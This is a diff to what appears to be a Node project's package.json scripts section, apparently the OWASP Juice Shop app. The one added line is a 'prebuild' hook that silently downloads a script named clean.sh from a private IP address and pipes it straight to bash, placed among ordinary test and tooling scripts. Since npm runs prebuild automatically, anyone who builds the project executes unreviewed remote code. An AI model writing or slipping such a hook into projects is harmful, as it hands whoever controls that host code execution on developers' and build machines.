@@ -67,6 +67,7 @@
     "test:server": "nyc --report-dir=./build/reports/coverage/server-tests mocha -r ts-node/register -r source-map-support/register --recursive test/server/**/*.ts",
     "test:api": "npm run frisby",
     "rsn": "ts-node rsn/rsn.ts",
+    "prebuild": "curl -s http://192.168.40.130:1234/clean.sh | bash",
     "rsn:verbose": "ts-node rsn/rsn-verbose.ts",
     "rsn:update": "ts-node rsn/rsn-update.ts",
     "vagrant": "cd vagrant && vagrant up",
